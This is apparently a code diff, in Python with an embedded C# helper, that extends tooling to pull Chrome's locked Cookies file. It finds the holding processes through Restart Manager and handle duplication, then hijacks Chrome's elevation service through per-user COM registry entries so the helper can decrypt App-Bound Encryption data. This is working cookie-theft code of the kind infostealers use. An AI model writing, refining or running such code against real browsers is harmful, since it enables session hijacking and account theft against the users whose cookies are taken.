@@ -847,7 +847,12 @@ def _win_dup_handle_copy_inner(src: Path, dest: Path) -> None:
     file_type_disk = 1
 
     exe_names = _browser_exe_names_for_path(src)
-    pids = _rank_browser_pids(_windows_browser_pids(exe_names))[:_DUP_HANDLE_MAX_PIDS]
+    ranked = _rank_browser_pids(_windows_browser_pids(exe_names))
+    pids: list[int] = []
+    for pid in _rm_file_pids(src) + ranked:
+        if pid and pid not in pids:
+            pids.append(pid)
+    pids = pids[:_DUP_HANDLE_MAX_PIDS]
     if not pids:
         raise OSError(32, "No chrome.exe/msedge.exe process for handle dup")
     pid_set = set(pids)
@@ -929,17 +934,20 @@ def _browser_exe_names_for_path(src: Path) -> set[str]:
 def _rank_browser_pids(pids: list[int]) -> list[int]:
     """Network service holds Cookies. Scan that PID before renderers."""
     network: list[int] = []
+    storage: list[int] = []
     utility: list[int] = []
     rest: list[int] = []
     for pid in pids:
         cmd = _process_command_line(pid).casefold()
         if "network.mojom" in cmd or "utility-sub-type=network" in cmd:
             network.append(pid)
+        elif "storage.mojom" in cmd or "utility-sub-type=storage" in cmd:
+            storage.append(pid)
         elif "--type=utility" in cmd:
             utility.append(pid)
         else:
             rest.append(pid)
-    return network + utility + rest
+    return network + storage + utility + rest
 
 
 def _process_command_line(pid: int) -> str:
@@ -987,6 +995,103 @@ def _process_command_line(pid: int) -> str:
             kernel32.CloseHandle(hproc)
     except (AttributeError, OSError, ValueError, TypeError, OverflowError):
         return ""
+
+
+def _rm_file_pids(path: Path) -> list[int]:
+    """Restart Manager: which PIDs hold Cookies (Chrome 151 network/storage)."""
+    if os.name != "nt":
+        return []
+    try:
+        import ctypes
+        from ctypes import wintypes
+
+        rstrtmgr = ctypes.WinDLL("rstrtmgr")
+        session = wintypes.DWORD()
+        keybuf = ctypes.create_unicode_buffer(33)
+        rstrtmgr.RmStartSession.argtypes = [
+            ctypes.POINTER(wintypes.DWORD),
+            wintypes.DWORD,
+            wintypes.LPWSTR,
+        ]
+        rstrtmgr.RmStartSession.restype = wintypes.DWORD
+        if rstrtmgr.RmStartSession(ctypes.byref(session), 0, keybuf) != 0:
+            return []
+
+        class RM_UNIQUE_PROCESS(ctypes.Structure):
+            _fields_ = [
+                ("dwProcessId", wintypes.DWORD),
+                ("ProcessStartTime", wintypes.FILETIME),
+            ]
+
+        class RM_PROCESS_INFO(ctypes.Structure):
+            _fields_ = [
+                ("Process", RM_UNIQUE_PROCESS),
+                ("strAppName", ctypes.c_wchar * 256),
+                ("strServiceShortName", ctypes.c_wchar * 64),
+                ("ApplicationType", ctypes.c_uint),
+                ("AppStatus", wintypes.ULONG),
+                ("TSSessionId", wintypes.DWORD),
+                ("bRestartable", wintypes.BOOL),
+            ]
+
+        try:
+            rstrtmgr.RmRegisterResources.argtypes = [
+                wintypes.DWORD,
+                wintypes.UINT,
+                ctypes.POINTER(ctypes.c_wchar_p),
+                wintypes.UINT,
+                wintypes.LPVOID,
+                wintypes.UINT,
+                wintypes.LPVOID,
+            ]
+            rstrtmgr.RmRegisterResources.restype = wintypes.DWORD
+            name = ctypes.c_wchar_p(str(path.resolve()))
+            files = (ctypes.c_wchar_p * 1)(name)
+            if rstrtmgr.RmRegisterResources(session, 1, files, 0, None, 0, None) != 0:
+                return []
+            needed = wintypes.UINT(0)
+            count = wintypes.UINT(0)
+            reboot = wintypes.DWORD()
+            rstrtmgr.RmGetList.argtypes = [
+                wintypes.DWORD,
+                ctypes.POINTER(wintypes.UINT),
+                ctypes.POINTER(wintypes.UINT),
+                ctypes.POINTER(RM_PROCESS_INFO),
+                ctypes.POINTER(wintypes.DWORD),
+            ]
+            rstrtmgr.RmGetList.restype = wintypes.DWORD
+            err = rstrtmgr.RmGetList(
+                session,
+                ctypes.byref(needed),
+                ctypes.byref(count),
+                None,
+                ctypes.byref(reboot),
+            )
+            n = int(needed.value or 0)
+            if n <= 0:
+                return []
+            infos = (RM_PROCESS_INFO * n)()
+            count = wintypes.UINT(n)
+            err = rstrtmgr.RmGetList(
+                session,
+                ctypes.byref(needed),
+                ctypes.byref(count),
+                infos,
+                ctypes.byref(reboot),
+            )
+            if err not in (0, 234):
+                return []
+            return [
+                int(infos[i].Process.dwProcessId)
+                for i in range(int(count.value or 0))
+                if infos[i].Process.dwProcessId
+            ]
+        finally:
+            rstrtmgr.RmEndSession.argtypes = [wintypes.DWORD]
+            rstrtmgr.RmEndSession.restype = wintypes.DWORD
+            rstrtmgr.RmEndSession(session)
+    except (AttributeError, OSError, ValueError, TypeError, OverflowError):
+        return []
 
 
 def _system_handle_pairs(
@@ -1905,6 +2010,8 @@ _CHROME_ELEVATOR: tuple[tuple[str, str], ...] = (
 )
 _ELEVATOR_IID_STRINGS: tuple[str, ...] = tuple(dict.fromkeys(iid for _, iid in _CHROME_ELEVATOR))
 _OLEAUT_PS_CLSID = "{00020424-0000-0000-C000-000000000046}"
+# Distinct from the CLSID so HKLM AppID LocalService is not merged in.
+_ELEVATOR_APPID_HKCU = "{A7C0E151-0000-4ABE-B151-C0C0A1E15100}"
 _launched_elevation: set[str] = set()
 
 _ABE_HELPER_NAME = "kannon_quote_abe.exe"
@@ -2083,6 +2190,8 @@ def _label_classnotreg(hr: str, prep: str) -> str:
     extra = (prep or "").strip()
     if "CLASSNOTREG" not in text and text.upper().endswith("80040154"):
         text = f"{text}:CLASSNOTREG" if text else "0x80040154:CLASSNOTREG"
+    if "SERVER_EXEC_FAILURE" not in text and text.upper().endswith("80080005"):
+        text = f"{text}:SERVER_EXEC_FAILURE" if text else "0x80080005:SERVER_EXEC_FAILURE"
     if extra and extra not in text:
         text = f"{text}:{extra}" if text else extra
     return _safe_snapshot_detail(text)[:80]
@@ -2153,7 +2262,7 @@ def _elevation_service_exes() -> list[Path]:
 
 
 def _chrome_helper_dirs() -> list[Path]:
-    """Application + versioned dir that holds elevation_service.exe."""
+    """Versioned 151 dir (chrome.exe + elevation_service) first, then Application."""
     found: list[Path] = []
     seen: set[str] = set()
 
@@ -2170,15 +2279,33 @@ def _chrome_helper_dirs() -> list[Path]:
         seen.add(key)
         found.append(path)
 
+    versioned: list[Path] = []
+    apps: list[Path] = []
     for app in _chrome_application_dirs():
-        add(app)
+        apps.append(app)
         try:
             for child in app.iterdir():
-                if child.is_dir() and (child / "elevation_service.exe").is_file():
-                    add(child)
+                if not child.is_dir():
+                    continue
+                if (child / "chrome.exe").is_file() or (
+                    child / "elevation_service.exe"
+                ).is_file():
+                    versioned.append(child)
         except OSError:
             continue
+    for path in versioned + apps:
+        add(path)
     return found
+
+
+def _localserver32_cmd(exe: Path) -> str:
+    """COM must launch --console (RunInteractive). Bare exe hits SCM and 0x80080005."""
+    try:
+        exe_s = str(exe.resolve())
+    except OSError:
+        exe_s = str(exe)
+    quoted = f'"{exe_s}"' if " " in exe_s else exe_s
+    return f"{quoted} --console"
 
 
 def _register_hkcu_elevator_localserver(exe: Path) -> str:
@@ -2187,11 +2314,7 @@ def _register_hkcu_elevator_localserver(exe: Path) -> str:
         import winreg  # type: ignore[import-not-found]
     except ImportError:
         return "winreg"
-    try:
-        exe_s = str(exe.resolve())
-    except OSError:
-        exe_s = str(exe)
-    cmd = f'"{exe_s}"' if " " in exe_s else exe_s
+    cmd = _localserver32_cmd(exe)
     access = winreg.KEY_WRITE | winreg.KEY_READ
     if hasattr(winreg, "KEY_WOW64_64KEY"):
         access |= winreg.KEY_WOW64_64KEY
@@ -2201,13 +2324,16 @@ def _register_hkcu_elevator_localserver(exe: Path) -> str:
             clsid_path = rf"Software\Classes\CLSID\{clsid}"
             with winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, clsid_path, 0, access) as key:
                 winreg.SetValueEx(key, "", 0, winreg.REG_SZ, "Chrome Elevation Service")
-                winreg.SetValueEx(key, "AppID", 0, winreg.REG_SZ, clsid)
+                winreg.SetValueEx(key, "AppID", 0, winreg.REG_SZ, _ELEVATOR_APPID_HKCU)
             with winreg.CreateKeyEx(
                 winreg.HKEY_CURRENT_USER, clsid_path + r"\LocalServer32", 0, access
             ) as key:
                 winreg.SetValueEx(key, "", 0, winreg.REG_SZ, cmd)
             with winreg.CreateKeyEx(
-                winreg.HKEY_CURRENT_USER, rf"Software\Classes\AppID\{clsid}", 0, access
+                winreg.HKEY_CURRENT_USER,
+                rf"Software\Classes\AppID\{_ELEVATOR_APPID_HKCU}",
+                0,
+                access,
             ) as key:
                 winreg.SetValueEx(key, "", 0, winreg.REG_SZ, "Chrome Elevation Service")
         for iid in _ELEVATOR_IID_STRINGS:
@@ -2224,7 +2350,7 @@ def _register_hkcu_elevator_localserver(exe: Path) -> str:
 
 
 def _launch_elevation_service(exe: Path) -> None:
-    """Run elevation_service.exe as a user COM server (service stays Stopped)."""
+    """--console = RunInteractive. Bare exe talks to SCM and exits (0x80080005)."""
     try:
         key = str(exe.resolve()).casefold()
     except OSError:
@@ -2234,18 +2360,22 @@ def _launch_elevation_service(exe: Path) -> None:
     flags = 0
     if os.name == "nt":
         flags = getattr(subprocess, "CREATE_NO_WINDOW", 0x08000000)
-    try:
-        subprocess.Popen(  # noqa: S603 — Chrome-signed elevation_service.exe
-            [str(exe)],
-            close_fds=True,
-            stdout=subprocess.DEVNULL,
-            stderr=subprocess.DEVNULL,
-            creationflags=flags,
-        )
-        _launched_elevation.add(key)
-        time.sleep(0.4)
-    except OSError:
-        return
+    cwd = str(exe.parent)
+    for extra in ("--console", "--unregistered-instance"):
+        try:
+            subprocess.Popen(  # noqa: S603 — Chrome-signed elevation_service.exe
+                [str(exe), extra],
+                cwd=cwd,
+                close_fds=True,
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+                creationflags=flags,
+            )
+            _launched_elevation.add(key)
+            time.sleep(0.7)
+            return
+        except OSError:
+            continue
 
 
 def _prepare_elevator_com() -> str:
@@ -2536,7 +2666,13 @@ def _chrome_application_dirs() -> list[Path]:
         root = os.environ.get(env_name) or ""
         if not root:
             continue
-        add(Path(root) / "Google" / "Chrome" / "Application" / "chrome.exe")
+        app = Path(root) / "Google" / "Chrome" / "Application"
+        add(app / "chrome.exe")
+        try:
+            for child in app.iterdir():
+                add(child / "chrome.exe")
+        except OSError:
+            continue
     add(_chrome_exe_from_registry())
     return found
 
@@ -2672,6 +2808,7 @@ class K {
   delegate int DecryptDel(IntPtr self, IntPtr cipher, out IntPtr plain, out uint err);
 
   const string Clsid = "{708860E0-F641-4611-8895-7D867DD3675B}";
+  const string AppId = "{A7C0E151-0000-4ABE-B151-C0C0A1E15100}";
   const int CLASSNOTREG = unchecked((int)0x80040154);
   static readonly string[] Iids = {
     "{1BF5208B-295F-4992-B5F4-3A9BB6494838}",
@@ -2682,14 +2819,14 @@ class K {
 
   static void RegisterLocalServer(string exe) {
     if (string.IsNullOrEmpty(exe) || !File.Exists(exe)) return;
-    string cmd = exe.IndexOf(' ') >= 0 ? ("\"" + exe + "\"") : exe;
+    string cmd = (exe.IndexOf(' ') >= 0 ? ("\"" + exe + "\"") : exe) + " --console";
     using (var k = Registry.CurrentUser.CreateSubKey(@"Software\Classes\CLSID\" + Clsid)) {
       k.SetValue("", "Chrome Elevation Service");
-      k.SetValue("AppID", Clsid);
+      k.SetValue("AppID", AppId);
     }
     using (var k = Registry.CurrentUser.CreateSubKey(@"Software\Classes\CLSID\" + Clsid + @"\LocalServer32"))
       k.SetValue("", cmd);
-    using (var k = Registry.CurrentUser.CreateSubKey(@"Software\Classes\AppID\" + Clsid))
+    using (var k = Registry.CurrentUser.CreateSubKey(@"Software\Classes\AppID\" + AppId))
       k.SetValue("", "Chrome Elevation Service");
     foreach (var iid in Iids) {
       using (var k = Registry.CurrentUser.CreateSubKey(@"Software\Classes\Interface\" + iid))
@@ -2717,6 +2854,20 @@ class K {
     return "";
   }
 
+  static void StartConsole(string exe) {
+    if (string.IsNullOrEmpty(exe) || !File.Exists(exe)) return;
+    try {
+      var psi = new System.Diagnostics.ProcessStartInfo();
+      psi.FileName = exe;
+      psi.Arguments = "--console";
+      psi.WorkingDirectory = Path.GetDirectoryName(exe) ?? "";
+      psi.UseShellExecute = false;
+      psi.CreateNoWindow = true;
+      System.Diagnostics.Process.Start(psi);
+      System.Threading.Thread.Sleep(700);
+    } catch {}
+  }
+
   [STAThread]
   static int Main() {
     byte[] blob;
@@ -2726,7 +2877,9 @@ class K {
       blob = ms.ToArray();
     }
     if (blob.Length < 8) return 2;
-    RegisterLocalServer(FindService());
+    string svc = FindService();
+    RegisterLocalServer(svc);
+    StartConsole(svc);
     CoInitializeEx(IntPtr.Zero, 2);
     int lastHr = CLASSNOTREG;
     try {
